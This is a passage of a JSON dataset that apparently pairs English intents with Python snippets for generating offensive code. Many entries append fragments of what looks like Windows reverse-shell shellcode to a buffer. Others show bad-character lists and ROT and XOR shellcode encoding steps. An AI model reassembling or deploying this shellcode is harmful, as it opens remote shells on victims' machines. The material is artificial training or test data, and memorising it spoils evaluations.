[
  {
    "intent": "initialize bad_chars to the string '\\x0a\\x00\\x0d'",
    "rewritten_intent": "initialize bad_chars to the string '\\x0a\\x00\\x0d'",
    "snippet": "bad_chars = '\\x0a\\x00\\x0d'",
    "slot_map": {
      "'\\x0a\\x00\\x0d'": "var2",
      "bad_chars": "var0"
    },
    "intent_tokens": [
      "initialize",
      "var0",
      "to",
      "string",
      "var2"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "``",
      "\\x0a\\x00\\x0d",
      "''"
    ]
  },
  {
    "intent": "remove '\\\\x' from the second argument, decode it in hexadecimal, and save in bad_chars",
    "rewritten_intent": "remove '\\\\x' from the second argument, decode it in hexadecimal, and save in bad_chars",
    "snippet": "bad_chars = sys.argv[2].replace('\\\\x', '').decode('hex')",
    "slot_map": {
      "'\\\\x'": "var0",
      "bad_chars": "var1"
    },
    "intent_tokens": [
      "remove",
      "var0",
      "from",
      "second",
      "argument",
      ",",
      "decode",
      "it",
      "in",
      "hexadecimal",
      ",",
      "and",
      "save",
      "in",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "=",
      "sys.argv",
      "[",
      "2",
      "]",
      ".replace",
      "(",
      "``",
      "\\\\x",
      "''",
      ",",
      "``",
      "''",
      ")",
      ".decode",
      "(",
      "``",
      "hex",
      "''",
      ")"
    ]
  },
  {
    "intent": "break",
    "rewritten_intent": "break",
    "snippet": "break",
    "slot_map": {},
    "intent_tokens": [
      "break"
    ],
    "snippet_tokens": [
      "break"
    ]
  },
  {
    "intent": "exit from the iteration",
    "rewritten_intent": "exit from the iteration",
    "snippet": "break",
    "slot_map": {},
    "intent_tokens": [
      "exit",
      "from",
      "iteration"
    ],
    "snippet_tokens": [
      "break"
    ]
  },
  {
    "intent": "break the cycle",
    "rewritten_intent": "break the cycle",
    "snippet": "break",
    "slot_map": {},
    "intent_tokens": [
      "break",
      "cycle"
    ],
    "snippet_tokens": [
      "break"
    ]
  },
  {
    "intent": "break the loop",
    "rewritten_intent": "break the loop",
    "snippet": "break",
    "slot_map": {},
    "intent_tokens": [
      "break",
      "loop"
    ],
    "snippet_tokens": [
      "break"
    ]
  },
  {
    "intent": "add the bytes literal \"\\x02\\x00\\x01\\xbb\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\x02\\x00\\x01\\xbb\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\" to the variable buf",
    "snippet": "buf += b\"\\x02\\x00\\x01\\xbb\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\"",
    "slot_map": {
      "\"\\x02\\x00\\x01\\xbb\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\x0d\\x01\\xc7\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\x0d\\x01\\xc7\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\" to the variable buf",
    "snippet": "buf += b\"\\x0d\\x01\\xc7\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\"",
    "slot_map": {
      "\"\\x0d\\x01\\xc7\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\x4a\\x26\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\x4a\\x26\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\" to the variable buf",
    "snippet": "buf += b\"\\x4a\\x26\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\"",
    "slot_map": {
      "\"\\x4a\\x26\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\x50\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\x50\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\" to the variable buf",
    "snippet": "buf += b\"\\x50\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\"",
    "slot_map": {
      "\"\\x50\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\x54\\x50\\x56\\x56\\x56\\x46\\x56\\x4e\\x56\\x56\\x53\\x56\\x68\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\x54\\x50\\x56\\x56\\x56\\x46\\x56\\x4e\\x56\\x56\\x53\\x56\\x68\" to the variable buf",
    "snippet": "buf += b\"\\x54\\x50\\x56\\x56\\x56\\x46\\x56\\x4e\\x56\\x56\\x53\\x56\\x68\"",
    "slot_map": {
      "\"\\x54\\x50\\x56\\x56\\x56\\x46\\x56\\x4e\\x56\\x56\\x53\\x56\\x68\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\" to the variable buf",
    "snippet": "buf += b\"\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\"",
    "slot_map": {
      "\"\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\x68\\x08\\x87\\x1d\\x60\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\x68\\x08\\x87\\x1d\\x60\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\" to the variable buf",
    "snippet": "buf += b\"\\x68\\x08\\x87\\x1d\\x60\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\"",
    "slot_map": {
      "\"\\x68\\x08\\x87\\x1d\\x60\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\x68\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x68\\x63\\x6d\\x64\\x00\\x89\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\x68\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x68\\x63\\x6d\\x64\\x00\\x89\" to the variable buf",
    "snippet": "buf += b\"\\x68\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x68\\x63\\x6d\\x64\\x00\\x89\"",
    "slot_map": {
      "\"\\x68\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x68\\x63\\x6d\\x64\\x00\\x89\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0c\\xff\\x4e\\x08\\x75\\xec\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0c\\xff\\x4e\\x08\\x75\\xec\" to the variable buf",
    "snippet": "buf += b\"\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0c\\xff\\x4e\\x08\\x75\\xec\"",
    "slot_map": {
      "\"\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0c\\xff\\x4e\\x08\\x75\\xec\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53\\xff\\xd5\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53\\xff\\xd5\" to the variable buf",
    "snippet": "buf += b\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53\\xff\\xd5\"",
    "slot_map": {
      "\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53\\xff\\xd5\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\" to the variable buf",
    "snippet": "buf += b\"\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\"",
    "slot_map": {
      "\"\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\x79\\xcc\\x3f\\x86\\xff\\xd5\\x89\\xe0\\x4e\\x56\\x46\\xff\\x30\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\x79\\xcc\\x3f\\x86\\xff\\xd5\\x89\\xe0\\x4e\\x56\\x46\\xff\\x30\" to the variable buf",
    "snippet": "buf += b\"\\x79\\xcc\\x3f\\x86\\xff\\xd5\\x89\\xe0\\x4e\\x56\\x46\\xff\\x30\"",
    "slot_map": {
      "\"\\x79\\xcc\\x3f\\x86\\xff\\xd5\\x89\\xe0\\x4e\\x56\\x46\\xff\\x30\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\" to the variable buf",
    "snippet": "buf += b\"\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\"",
    "slot_map": {
      "\"\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\" to the variable buf",
    "snippet": "buf += b\"\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\"",
    "slot_map": {
      "\"\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\" to the variable buf",
    "snippet": "buf += b\"\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\"",
    "slot_map": {
      "\"\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\" to the variable buf",
    "snippet": "buf += b\"\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\"",
    "slot_map": {
      "\"\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\" to the variable buf",
    "snippet": "buf += b\"\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"",
    "slot_map": {
      "\"\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\xc7\\x44\\x24\\x3c\\x01\\x01\\x8d\\x44\\x24\\x10\\xc6\\x00\\x44\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\xc7\\x44\\x24\\x3c\\x01\\x01\\x8d\\x44\\x24\\x10\\xc6\\x00\\x44\" to the variable buf",
    "snippet": "buf += b\"\\xc7\\x44\\x24\\x3c\\x01\\x01\\x8d\\x44\\x24\\x10\\xc6\\x00\\x44\"",
    "slot_map": {
      "\"\\xc7\\x44\\x24\\x3c\\x01\\x01\\x8d\\x44\\x24\\x10\\xc6\\x00\\x44\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\" to the variable buf",
    "snippet": "buf += b\"\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\"",
    "slot_map": {
      "\"\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x05\\x68\\xc0\\xa8\\x74\\xc7\\x68\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x05\\x68\\xc0\\xa8\\x74\\xc7\\x68\" to the variable buf",
    "snippet": "buf += b\"\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x05\\x68\\xc0\\xa8\\x74\\xc7\\x68\"",
    "slot_map": {
      "\"\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x05\\x68\\xc0\\xa8\\x74\\xc7\\x68\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\xe3\\x57\\x57\\x57\\x31\\xf6\\x6a\\x12\\x59\\x56\\xe2\\xfd\\x66\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\xe3\\x57\\x57\\x57\\x31\\xf6\\x6a\\x12\\x59\\x56\\xe2\\xfd\\x66\" to the variable buf",
    "snippet": "buf += b\"\\xe3\\x57\\x57\\x57\\x31\\xf6\\x6a\\x12\\x59\\x56\\xe2\\xfd\\x66\"",
    "slot_map": {
      "\"\\xe3\\x57\\x57\\x57\\x31\\xf6\\x6a\\x12\\x59\\x56\\xe2\\xfd\\x66\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\" to the variable buf",
    "snippet": "buf += b\"\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\"",
    "slot_map": {
      "\"\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\" to the variable buf",
    "snippet": "buf += b\"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\"",
    "slot_map": {
      "\"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d\" to the variable buf",
    "snippet": "buf += b\"\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d\"",
    "slot_map": {
      "\"\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "add the bytes literal \"\\xff\\xd5\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\" to the variable buf",
    "rewritten_intent": "add the bytes literal \"\\xff\\xd5\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\" to the variable buf",
    "snippet": "buf += b\"\\xff\\xd5\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\"",
    "slot_map": {
      "\"\\xff\\xd5\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\"": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "add",
      "bytes",
      "literal",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "bvar0"
    ]
  },
  {
    "intent": "Declare an empty bytes literal and store it in the variable buf",
    "rewritten_intent": "Declare an empty bytes literal and store it in the variable buf",
    "snippet": "buf = b\"\"",
    "slot_map": {
      "buf": "var0"
    },
    "intent_tokens": [
      "Declare",
      "empty",
      "bytes",
      "literal",
      "and",
      "store",
      "it",
      "in",
      "variable",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "b",
      "''"
    ]
  },
  {
    "intent": "byte is the sum of y and ROT modulo 256",
    "rewritten_intent": "byte is the sum of y and ROT modulo 256",
    "snippet": "byte = (y + ROT)%256",
    "slot_map": {
      "ROT": "var0",
      "modulo": "var1"
    },
    "intent_tokens": [
      "byte",
      "is",
      "sum",
      "of",
      "y",
      "and",
      "var0",
      "var1",
      "256"
    ],
    "snippet_tokens": [
      "byte",
      "=",
      "(",
      "y",
      "+",
      "var0",
      ")",
      "%",
      "256"
    ]
  },
  {
    "intent": "byte is byte xor XOR",
    "rewritten_intent": "byte is byte xor XOR",
    "snippet": "byte = byte ^ XOR",
    "slot_map": {
      "XOR": "var0"
    },
    "intent_tokens": [
      "byte",
      "is",
      "byte",
      "xor",
      "var0"
    ],
    "snippet_tokens": [
      "byte",
      "=",
      "byte",
      "^",
      "var0"
    ]
  },
  {
    "intent": "byte is byte shifted left by nbits",
    "rewritten_intent": "byte is byte shifted left by nbits",
    "snippet": "byte = byte << nbits",
    "slot_map": {
      "nbits": "var0"
    },
    "intent_tokens": [
      "byte",
      "is",
      "byte",
      "shifted",
      "left",
      "by",
      "var0"
    ],
    "snippet_tokens": [
      "byte",
      "=",
      "byte",
      "<",
      "<",
      "var0"
    ]
  },
  {
    "intent": "assign the first two elements of shellcode to chunk",
    "rewritten_intent": "assign the first two elements of shellcode to chunk",
    "snippet": "chunk = shellcode[0:2]",
    "slot_map": {
      "shellcode": "var0"
    },
    "intent_tokens": [
      "assign",
      "first",
      "two",
      "elements",
      "of",
      "var0",
      "to",
      "chunk"
    ],
    "snippet_tokens": [
      "chunk",
      "=",
      "var0",
      "[",
      "0:2",
      "]"
    ]
  },
  {
    "intent": "add 1 to chunk_no",
    "rewritten_intent": "add 1 to chunk_no",
    "snippet": "chunk_no += 1",
    "slot_map": {
      "chunk_no": "var0"
    },
    "intent_tokens": [
      "add",
      "1",
      "to",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      "+=",
      "1"
    ]
  },
  {
    "intent": "chunk_no is integer 0",
    "rewritten_intent": "chunk_no is integer 0",
    "snippet": "chunk_no = 0",
    "slot_map": {
      "chunk_no": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "integer",
      "0"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "0"
    ]
  },
  {
    "intent": "increment count by 1",
    "rewritten_intent": "increment count by 1",
    "snippet": "count += 1",
    "slot_map": {},
    "intent_tokens": [
      "increment",
      "count",
      "by",
      "1"
    ],
    "snippet_tokens": [
      "count",
      "+=",
      "1"
    ]
  },
  {
    "intent": "count is integer 1",
    "rewritten_intent": "count is integer 1",
    "snippet": "count = 1",
    "slot_map": {},
    "intent_tokens": [
      "count",
      "is",
      "integer",
      "1"
    ],
    "snippet_tokens": [
      "count",
      "=",
      "1"
    ]
  },
  {
    "intent": "increase counter by 1",
    "rewritten_intent": "increase counter by 1",
    "snippet": "counter += 1",
    "slot_map": {},
    "intent_tokens": [
      "increase",
      "counter",
      "by",
      "1"
    ],
    "snippet_tokens": [
      "counter",
      "+=",
      "1"
    ]
  },
  {
    "intent": "counter is an integer 0",
    "rewritten_intent": "counter is an integer 0",
    "snippet": "counter = 0",
    "slot_map": {},
    "intent_tokens": [
      "counter",
      "is",
      "integer",
      "0"
    ],
    "snippet_tokens": [
      "counter",
      "=",
      "0"
    ]
  },
  {
    "intent": "cast the string hopcode to integer base 16 and save it into the variable Dec_hopcode",
    "rewritten_intent": "cast the string hopcode to integer base 16 and save it into the variable Dec_hopcode",
    "snippet": "Dec_hopcode = int(hopcode, 16)",
    "slot_map": {
      "Dec_hopcode": "var0"
    },
    "intent_tokens": [
      "cast",
      "string",
      "hopcode",
      "to",
      "integer",
      "base",
      "16",
      "and",
      "save",
      "it",
      "into",
      "variable",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "int",
      "(",
      "hopcode",
      ",",
      "16",
      ")"
    ]
  },
  {
    "intent": "add the string value '\\\\x' to the variable decoded",
    "rewritten_intent": "add the string value '\\\\x' to the variable decoded",
    "snippet": "decoded += '\\\\x'",
    "slot_map": {
      "'\\\\x'": "var0"
    },
    "intent_tokens": [
      "add",
      "string",
      "value",
      "var0",
      "to",
      "variable",
      "decoded"
    ],
    "snippet_tokens": [
      "decoded",
      "+=",
      "``",
      "\\\\x",
      "''"
    ]
  },
  {
    "intent": "Convert the variable x to a hexadecimal and store it in the variable decoded",
    "rewritten_intent": "Convert the variable x to a hexadecimal and store it in the variable decoded",
    "snippet": "decoded += '%02x' % x",
    "slot_map": {},
    "intent_tokens": [
      "Convert",
      "variable",
      "x",
      "to",
      "hexadecimal",
      "and",
      "store",
      "it",
      "in",
      "variable",
      "decoded"
    ],
    "snippet_tokens": [
      "decoded",
      "+=",
      "'",
      "%",
      "02x",
      "'",
      "%",
      "x"
    ]
  },
  {
    "intent": "initialize an empty string variable called decoded",
    "rewritten_intent": "initialize an empty string variable called decoded",
    "snippet": "decoded = \"\"",
    "slot_map": {},
    "intent_tokens": [
      "initialize",
      "empty",
      "string",
      "variable",
      "called",
      "decoded"
    ],
    "snippet_tokens": [
      "decoded",
      "=",
      "``"
    ]
  },
  {
    "intent": "Convert the variable x to a hexadecimal and add it to the variable decoded2 followed by ','",
    "rewritten_intent": "Convert the variable x to a hexadecimal and add it to the variable decoded2 followed by ','",
    "snippet": "decoded2 += '%02x,' % x",
    "slot_map": {
      "','": "var1",
      "decoded2": "var0"
    },
    "intent_tokens": [
      "Convert",
      "variable",
      "x",
      "to",
      "hexadecimal",
      "and",
      "add",
      "it",
      "to",
      "variable",
      "var0",
      "followed",
      "by",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "+=",
      "'",
      "%",
      "02x",
      ",",
      "'",
